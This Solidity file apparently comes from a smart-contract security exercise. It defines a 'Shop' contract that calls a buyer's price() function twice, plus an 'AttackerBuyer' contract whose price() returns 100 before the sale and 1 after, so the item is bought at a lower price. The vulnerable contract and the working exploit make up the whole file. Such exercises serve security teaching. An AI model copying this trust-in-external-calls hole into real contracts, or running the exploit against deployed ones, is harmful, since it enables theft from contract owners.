// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint256);
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}

contract AttackerBuyer is Buyer {
    Shop public shop;
    
    constructor(address _shop) {
        shop = Shop(_shop);
    }
    
    function price() external view override returns (uint256) {
        // First call: return >= 100 to pass the check
        // Second call: return < 100 to set a lower price
        if (!shop.isSold()) {
            return 100;  // First call - pass the check
        } else {
            return 1;    // Second call - set low price
        }
    }
    
    function attack() external {
        shop.buy();
    }
}